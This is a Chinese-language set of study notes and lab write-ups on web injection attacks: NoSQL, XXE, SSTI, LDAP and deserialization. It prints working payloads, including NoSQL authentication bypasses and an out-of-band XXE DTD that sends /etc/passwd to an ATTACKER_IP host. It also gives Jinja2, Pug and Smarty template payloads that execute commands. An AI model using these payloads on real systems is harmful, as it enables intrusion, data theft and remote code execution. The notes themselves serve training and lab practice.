<h4 id="数据库指纹识别"><a href="#数据库指纹识别" class="headerlink" title="数据库指纹识别"></a>数据库指纹识别</h4><p>确定数据库的类型和版本是定制攻击的关键一步。这可以通过发送特定的查询来实现，因为不同的 DBMS 会对相同的查询给出不同的结果。例如，<code>SELECT version()</code> 在 PostgreSQL 上有效，而 <code>SELECT @@version</code> 则适用于 MySQL 和 MSSQL。通过这些差异，攻击者可以准确识别目标数据库。</p>
<h4 id="利用-SQL-注入进行内网渗透"><a href="#利用-SQL-注入进行内网渗透" class="headerlink" title="利用 SQL 注入进行内网渗透"></a>利用 SQL 注入进行内网渗透</h4><p>SQL 注入漏洞不仅能获取数据库信息，还可以作为跳板，进一步渗透到网络的其他部分。一旦数据库服务器被攻破，它就可以被用来访问其他内部系统。这可能涉及从数据库中提取凭据（如用户名和密码），或者利用系统之间已存在的信任关系来扩大攻击范围。</p>
<h1 id="NO-SQL"><a href="#NO-SQL" class="headerlink" title="NO SQL"></a>NO SQL</h1><h2 id="No-SQL-注入"><a href="#No-SQL-注入" class="headerlink" title="No SQL 注入"></a>No SQL 注入</h2><h3 id="注入类型"><a href="#注入类型" class="headerlink" title="注入类型"></a>注入类型</h3><ul>
<li><p>语法注入</p>
<ul>
<li>类似于传统的 SQL 注入了，操纵语句导致执行非预期行为</li>
</ul>
</li>
<li><p>操作符注入</p>
<ul>
<li><p>而这个就是用 NoSQL 特殊的操作符，改变逻辑代码的行为了</p>
</li>
<li><figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E5C07B">db</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">users</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">find</span><span style="color: #ABB2BF">({ </span><span style="color: #E06C75">username</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&#39;admin&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">password</span><span style="color: #ABB2BF">: { </span><span style="color: #98C379">&quot;$ne&quot;</span><span style="color: #ABB2BF">: </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF"> } });</span></span></code></pre></div></div></figure></li>
</ul>
</li>
</ul>
<h2 id="操作符注入"><a href="#操作符注入" class="headerlink" title="操作符注入"></a>操作符注入</h2><figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;username&#39;</span><span style="color: #C678DD">=&gt;</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;$ne&#39;</span><span style="color: #C678DD">=&gt;</span><span style="color: #98C379">&#39;xxxx&#39;</span><span style="color: #ABB2BF">], </span><span style="color: #98C379">&#39;password&#39;</span><span style="color: #C678DD">=&gt;</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;$ne&#39;</span><span style="color: #C678DD">=&gt;</span><span style="color: #98C379">&#39;yyyy&#39;</span><span style="color: #ABB2BF">]]</span></span></code></pre></div></div></figure>

<p>这样一个代码就能把整个数据库 dump 出来。</p>
<h3 id="POST-请求传数组"><a href="#POST-请求传数组" class="headerlink" title="POST 请求传数组"></a>POST 请求传数组</h3><p>HTTP 的语法 <code>key[subkey]=value</code></p>
<figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$ne</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">xxxx</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">pass</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$ne</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">yyyy</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># </span><span style="color: #E06C75">登录</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">admin</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">之外的用户</span></span>
<span class="line"><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$nin</span><span style="color: #ABB2BF">][]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">admin</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">pass</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$ne</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">yyyy</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># </span><span style="color: #E06C75">nin</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">接收的是一个数组</span><span style="color: #ABB2BF">，</span><span style="color: #E06C75">用这种方式来拼接的</span></span>
<span class="line"><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$nin</span><span style="color: #ABB2BF">][]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">admin</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$nin</span><span style="color: #ABB2BF">][]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">pedro</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$nin</span><span style="color: #ABB2BF">][]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">john</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">user</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$nin</span><span style="color: #ABB2BF">][]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">secret</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">pass</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$ne</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">yyyy</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># </span><span style="color: #E06C75">爆破密码位数</span></span>
<span class="line"><span style="color: #E06C75">user</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">john</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">pass</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$regex</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=^</span><span style="color: #ABB2BF">.{</span><span style="color: #D19A66">8</span><span style="color: #ABB2BF">}</span><span style="color: #E06C75">$</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># </span><span style="color: #E06C75">爆破密码</span></span>
<span class="line"><span style="color: #E06C75">user</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">john</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">pass</span><span style="color: #ABB2BF">[</span><span style="color: #E06C75">$regex</span><span style="color: #ABB2BF">]</span><span style="color: #56B6C2">=^</span><span style="color: #D19A66">1.</span><span style="color: #ABB2BF">......</span><span style="color: #E06C75">$</span></span>
<span class="line"></span>
<span class="line"><span style="color: #D19A66">10584312</span></span></code></pre></div></div></figure>

<h2 id="语法注入"><a href="#语法注入" class="headerlink" title="语法注入"></a>语法注入</h2><p>这一节就有点抽象了，要结合具体代码来理解，原始代码如下</p>
<figure class="shiki js"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">for</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">x</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">in</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">mycol</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">find</span><span style="color: #ABB2BF">({</span><span style="color: #98C379">&quot;$where&quot;</span><span style="color: #ABB2BF">: </span><span style="color: #98C379">&quot;this.username == &#39;&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">username</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">+</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;&#39;&quot;</span><span style="color: #ABB2BF">}):</span></span></code></pre></div></div></figure>

<h3 id="发现注入"><a href="#发现注入" class="headerlink" title="发现注入"></a>发现注入</h3><p>这是我们加了一个 <code>&#39;</code> 让他报错得出来的原始代码，这个其实是三个部分拼接而成的</p>
<ul>
<li>“this.username &#x3D;&#x3D; ‘“</li>
<li>username</li>
<li>“‘“</li>
</ul>
<p>如果我们加了一个 <code>&#39;</code> 执行的语句就变成了</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&quot;this.username == &#39;admin&#39;&#39;&quot;</span></span></code></pre></div></div></figure>

<p>那肯定会报错的</p>
<h3 id="验证注入"><a href="#验证注入" class="headerlink" title="验证注入"></a>验证注入</h3><p>第一次输入：<code>admin&#39; &amp;&amp; 0 &amp;&amp; &#39;x</code></p>
<p>执行的语句变成</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&quot;this.username == &#39;admin&#39; &amp;&amp; 0 &amp;&amp; &#39;x&#39;&quot;</span></span></code></pre></div></div></figure>

<p><code>&quot;this.username == &#39;admin&#39;</code> 这是一个布尔值， <code>&amp;&amp; 0</code> 与任何值计算都是 false，所以折一整个语句都会是 false。</p>
<p><code>&amp;&amp; &#39;x</code> 的作用是为了闭合原始查询中剩下的引号。</p>
<p>第二次输入： <code>admin&#39; &amp;&amp; 1 &amp;&amp; &#39;x</code></p>
<p>执行的语句为：</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&quot;this.username == &#39;admin&#39; &amp;&amp; 1 &amp;&amp; &#39;x&#39;&quot;</span></span></code></pre></div></div></figure>

<p>执行结果为真，返回结果，证明注入存在。</p>
<h3 id="利用注入"><a href="#利用注入" class="headerlink" title="利用注入"></a>利用注入</h3><p>Payload：<code>admin&#39;||1||&#39;</code></p>
<p>具体执行的代码：</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">&quot;this.username == &#39;admin&#39;||1||&#39;&#39;&quot;</span></span></code></pre></div></div></figure>

<p>不论 admin 存在和不存在，这个表达式都能返回真，导致整个数据库泄露。</p>
<h1 id="XXE-注入"><a href="#XXE-注入" class="headerlink" title="XXE 注入"></a>XXE 注入</h1><p>介绍了一堆实体和解析器，不懂，没了解过</p>
<p>payload 主要是下面这个，用自带的实体解析器，去执行语句或者读取文件</p>
<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;!</span><span style="color: #C678DD">DOCTYPE</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">foo</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">[</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;!</span><span style="color: #C678DD">ENTITY</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">xxe</span><span style="color: #C678DD"> SYSTEM </span><span style="color: #98C379">&quot;file:///opt/14232d6db2b5fd937aa92e8b3c48d958.txt&quot;</span><span style="color: #ABB2BF"> &gt;</span><span style="color: #D19A66">]</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>

<h2 id="带外-XXE"><a href="#带外-XXE" class="headerlink" title="带外 XXE"></a>带外 XXE</h2><p> 构建一个 DTD 文件</p>
<figure class="shiki dtd"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre><code><!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
%oobxxe;</code></pre></div></div></figure>

<p>payload</p>
<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;?</span><span style="color: #E06C75">xml</span><span style="color: #D19A66"> version</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;1.0&quot;</span><span style="color: #D19A66"> encoding</span><span style="color: #ABB2BF">=</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">?&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;!</span><span style="color: #C678DD">DOCTYPE</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">upload</span><span style="color: #ABB2BF"> SYSTEM &quot;http://ATTACKER_IP:1337/sample.dtd&quot;&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">upload</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">    &lt;</span><span style="color: #E06C75">file</span><span style="color: #ABB2BF">&gt;</span><span style="color: #D19A66">&amp;</span><span style="color: #E06C75">exfil</span><span style="color: #D19A66">;</span><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">file</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">upload</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>

<p>攻击机起一个 http 服务端，会接收到拿回来的数据。</p>
<h2 id="SSRF-XXE"><a href="#SSRF-XXE" class="headerlink" title="SSRF + XXE"></a>SSRF + XXE</h2><p>同样的套路，payload 如下，要配合 Burp 使用，遍历这个主机上的端口</p>
<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;!</span><span style="color: #C678DD">DOCTYPE</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">foo</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">[</span></span>
<span class="line"><span style="color: #ABB2BF">  &lt;!ELEMENT foo ANY &gt;</span></span>
<span class="line"><span style="color: #ABB2BF">  &lt;!</span><span style="color: #C678DD">ENTITY</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">xxe</span><span style="color: #C678DD"> SYSTEM </span><span style="color: #98C379">&quot;http://localhost:§10§/&quot;</span><span style="color: #ABB2BF"> &gt;</span></span>
<span class="line"><span style="color: #D19A66">]</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">contact</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">name</span><span style="color: #ABB2BF">&gt;</span><span style="color: #D19A66">&amp;</span><span style="color: #E06C75">xxe</span><span style="color: #D19A66">;</span><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">name</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">email</span><span style="color: #ABB2BF">&gt;test@test.com&lt;/</span><span style="color: #E06C75">email</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">  &lt;</span><span style="color: #E06C75">message</span><span style="color: #ABB2BF">&gt;test&lt;/</span><span style="color: #E06C75">message</span><span style="color: #ABB2BF">&gt;</span></span>
<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">contact</span><span style="color: #ABB2BF">&gt;</span></span></code></pre></div></div></figure>

<h2 id="缓解措施"><a href="#缓解措施" class="headerlink" title="缓解措施"></a>缓解措施</h2><h3 id="最佳实践-1"><a href="#最佳实践-1" class="headerlink" title="最佳实践"></a>最佳实践</h3><p>禁用外部实体和 DTDs</p>
<p>使用简单数据格式，比如说 JSON</p>
<p>增强输入校验，检验输入数据是否符合特定的格式，还有过滤一些 XML 特有的符号，比如 <code>&lt;, &gt;, &amp;, &#39;, and &quot;</code> </p>
<hr>
<h1 id="Server-side-Template-Injection"><a href="#Server-side-Template-Injection" class="headerlink" title="Server-side Template Injection"></a>Server-side Template Injection</h1><p>主要还是用了那个模板引擎的一些模板语法，造成注入</p>
<h2 id="区分模板引擎"><a href="#区分模板引擎" class="headerlink" title="区分模板引擎"></a>区分模板引擎</h2><p>Twig 执行 <code>&#123;&#123;7*7'&#125;&#125;</code> 会输出 49，Jinja2 则会输出 7777777</p>
<p>Jade&#x2F;Pug，则是用 # 代表模板语法，#{7*7} would return 49</p>
<h3 id="PHP-Smarty"><a href="#PHP-Smarty" class="headerlink" title="PHP - Smarty"></a>PHP - Smarty</h3><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 输出结果会全部变成大写</span></span>
<span class="line"><span style="color: #ABB2BF">{</span><span style="color: #98C379">&#39;Hello&#39;</span><span style="color: #56B6C2">|</span><span style="color: #ABB2BF">upper}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 可以直接调用 PHP 语法</span></span>
<span class="line"><span style="color: #ABB2BF">{</span><span style="color: #56B6C2">system</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ls&quot;</span><span style="color: #ABB2BF">)}</span></span></code></pre></div></div></figure>

<h3 id="NodeJS-Pug"><a href="#NodeJS-Pug" class="headerlink" title="NodeJS - Pug"></a>NodeJS - Pug</h3><h4 id="关键漏洞点"><a href="#关键漏洞点" class="headerlink" title="关键漏洞点"></a>关键漏洞点</h4><ul>
<li>JavaScript 执行<ul>
<li>Pug 允许嵌入 JS 语句在 #{} 里面，会被当成 JS 代码执行，造成任意代码执行。</li>
</ul>
</li>
<li>默认转义<ul>
<li>Pug 模板引擎在渲染时，会<strong>自动对某些输出进行 HTML 转义 (HTML Escaping)</strong>。这意味着当你在模板中使用标准的 <code>#&#123;&#125;</code> 进行变量插值时，Pug 会把 HTML 特殊字符（比如 <code>&lt;</code>、<code>&gt;</code>、<code>&amp;</code>、<code>&quot;</code>、<code>&#39;</code>）转换成它们的 HTML 实体编码。<ul>
<li><strong><code>#&#123;&#125;</code> (默认行为)：</strong> HTML 转义，主要用于<strong>防 XSS</strong>。</li>
<li><strong><code>!&#123;&#125;</code> (非转义)：</strong> <strong>不进行 HTML 转义</strong>，因此如果使用不当，<strong>容易导致 XSS</strong>。</li>
</ul>
</li>
<li><strong>默认转义的局限性：</strong> 尽管能防大部分 XSS，但对 <code>!&#123;&#125;</code> 无效，且不能阻止<strong>服务端层面的代码执行（SSTI 本身）</strong>，因为 SSTI 发生在模板渲染的服务器端，而 HTML 转义是针对生成 HTML 内容的。</li>
</ul>
</li>
</ul>
<h4 id="利用-Payload"><a href="#利用-Payload" class="headerlink" title="利用 Payload"></a>利用 Payload</h4><figure class="shiki javascript"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">#{</span><span style="color: #E5C07B">root</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">process</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">mainModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">require</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;child_process&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">spawnSync</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;ls&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #E06C75">stdout</span><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>

<p> <code>spawnSync</code> 不能直接传命令执行，它不会自动解析你传入的命令字符串中的参数。它会把整个字符串当作一个单一的命令来尝试执行，而不是拆分成命令和独立参数。</p>
<figure class="shiki javascript"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">spawnSync</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">command</span><span style="color: #ABB2BF">, [</span><span style="color: #E06C75">args</span><span style="color: #ABB2BF">], [</span><span style="color: #E06C75">options</span><span style="color: #ABB2BF">])</span></span>
<span class="line"></span>
<span class="line"><span style="color: #ABB2BF"># </span><span style="color: #E06C75">最终</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">payload</span></span>
<span class="line"><span style="color: #ABB2BF">#{</span><span style="color: #E5C07B">root</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">process</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">mainModule</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">require</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;child_process&#39;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">spawnSync</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;cat&#39;</span><span style="color: #ABB2BF">, [</span><span style="color: #98C379">&#39;7f58571b42d8c477a2f3efa69a681ac3.txt&#39;</span><span style="color: #ABB2BF">]).</span><span style="color: #E06C75">stdout</span><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>

<h3 id="Python-Jinja2"><a href="#Python-Jinja2" class="headerlink" title="Python - Jinja2"></a>Python - Jinja2</h3><p>Jinja2 解析表达式用的是花括号，测试 payload <code>&#123;&#123;7*7&#125;&#125;</code></p>
<p>一旦确定能执行的话，我们就可以用这个 payload 来实现 RCE</p>
<figure class="shiki python"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">{{</span><span style="color: #98C379">&quot;&quot;</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">__class__</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">__mro__</span><span style="color: #ABB2BF">[</span><span style="color: #D19A66">1</span><span style="color: #ABB2BF">].</span><span style="color: #E06C75">__subclasses__</span><span style="color: #ABB2BF">()[</span><span style="color: #D19A66">157</span><span style="color: #ABB2BF">].</span><span style="color: #56B6C2">__repr__</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">__globals__</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;__builtins__&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;__import__&quot;</span><span style="color: #ABB2BF">)(</span><span style="color: #98C379">&quot;subprocess&quot;</span><span style="color: #ABB2BF">).</span><span style="color: #61AFEF">check_output</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;cat 5d8bea6df83cbb6767a235c4ba54933b.txt&quot;</span><span style="color: #ABB2BF">)}}</span></span></code></pre></div></div></figure>

<p>拆解一下 payload</p>
<ul>
<li><code>&quot;&quot;.__class__.__mro__[1]</code> 这个方法能访问到基类 <code>object</code> ，他是所有 python 类的父类。</li>
<li><code>__subclasses__()</code>: 把 <code>object</code> 的所有子类显示出来, 然后 <code>[157]</code> 一般是 <code>subprocess.Popen</code> 类的索引（这个索引数和目标环境有关系）。</li>
</ul>
<p>然后如果你用 <code>check_output</code> 的话，执行带参数的命令他会当作一个完整的可执行程序名去查找和运行，而不是把 cat 当作程序，文件名当作参数。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">{{&quot;&quot;.__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get(&quot;__builtins__&quot;).get(&quot;__import__&quot;)(&quot;subprocess&quot;).check_output([&quot;cat&quot;,&quot;5d8bea6df83cbb6767a235c4ba54933b.txt&quot;])}}</span></span></code></pre></div></div></figure>

<h2 id="自动化利用工具"><a href="#自动化利用工具" class="headerlink" title="自动化利用工具"></a>自动化利用工具</h2><p><a target="_blank" rel="noopener" href="https://github.com/vladko312/SSTImap">SSTImap</a></p>
<h2 id="挑战"><a href="#挑战" class="headerlink" title="挑战"></a>挑战</h2><p>题目给了一个 Form Tools 的靶场，在网上搜了一下发现有洞，一个是 <a target="_blank" rel="noopener" href="https://github.com/DeepMountains/Mirage/blob/main/CVE2-3.md">SSRF</a>，在创建模板的页面里面有一个智能爬取功能，会执行 curl，还有一个是 <a target="_blank" rel="noopener" href="https://vuldb.com/?submit.372318">SSTI</a>，给的提示说是改 <code>Page Theme</code> 不过我改的 <code>Page Titles</code> 能起作用，不过每次都要重新登录一下账号才能起作用，最后还是拿到 flag。</p>
<h1 id="LDAP-注入"><a href="#LDAP-注入" class="headerlink" title="LDAP 注入"></a>LDAP 注入</h1><p>这个 LDAP 和 AD 强关联</p>
<p>LDAP 搜索语法</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">(base DN) (scope) (filter) (attributes)</span></span>
<span class="line"><span style="color: #abb2bf"></span></span>
<span class="line"><span style="color: #abb2bf">ldapsearch -x -H ldap://10.10.55.42:389 -b &quot;dc=ldap,dc=thm&quot; &quot;(ou=People)&quot;</span></span></code></pre></div></div></figure>

<p>其实也是一个通配符引起的注入，一个 <code>*</code> 干全部。</p>
<h1 id="Injects"><a href="#Injects" class="headerlink" title="Injects"></a>Injects</h1><p>用下面这个语句登录进了普通管理页面，没啥用，看了一下别人的 wp 是用 SQL 注入字典跑出来的，我也整理了一份。</p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">1%27%09||%091=1%09--%09</span></span></code></pre></div></div></figure>

<p>SSTI 利用则参考：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/314028.html">https://www.freebuf.com/articles/web/314028.html</a></p>
<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">{{[&quot;cat ./flags/5d8af1dc14503c7e4bdc8e51a3469f48.txt&quot;, 0]|sort(&quot;passthru&quot;)}}</span></span></code></pre></div></div></figure>

<h1 id="Insecure-Deserialisation"><a href="#Insecure-Deserialisation" class="headerlink" title="Insecure Deserialisation"></a>Insecure Deserialisation</h1><p>终于讲到反序列化了</p>
<h2 id="鉴别"><a href="#鉴别" class="headerlink" title="鉴别"></a>鉴别</h2><h3 id="能访问到源码"><a href="#能访问到源码" class="headerlink" title="能访问到源码"></a>能访问到源码</h3><p>观察 <code>serialize()</code>, <code>unserialize()</code>, <code>pickle.loads()</code> 和其他的方法</p>
<h3 id="不能访问到源码"><a href="#不能访问到源码" class="headerlink" title="不能访问到源码"></a>不能访问到源码</h3><p>也就是黑盒测试，试着加 ~ 在文件末尾，这可能会访问到之前因为编辑留下来的备份文件什么的。或者 <code>.bak</code> 之类的试试。</p>
<h4 id="分析服务器响应"><a href="#分析服务器响应" class="headerlink" title="分析服务器响应"></a>分析服务器响应</h4><ul>
<li>可能会抛出相关方法的错误消息</li>
<li>修改 POST 和 Cookie ，观察程序的反应，可能会有洞</li>
</ul>
<h4 id="检查-Cookie"><a href="#检查-Cookie" class="headerlink" title="检查 Cookie"></a>检查 Cookie</h4><p>Cookie 可能包含一些反序列化的数据</p>
<ul>
<li>base64 编码的 cookie：PHP 和 NET</li>
<li>ASP：__VIEWSTATE</li>
</ul>
<h2 id="自动化脚本"><a href="#自动化脚本" class="headerlink" title="自动化脚本"></a>自动化脚本</h2><h3 id="PHPGGC"><a href="#PHPGGC" class="headerlink" title="PHPGGC"></a>PHPGGC</h3><figure class="shiki sh"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">php</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">phpggc</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-l</span></span>
<span class="line"></span>
<span class="line"><span style="color: #7F848E; font-style: italic"># 查看 payload</span></span>
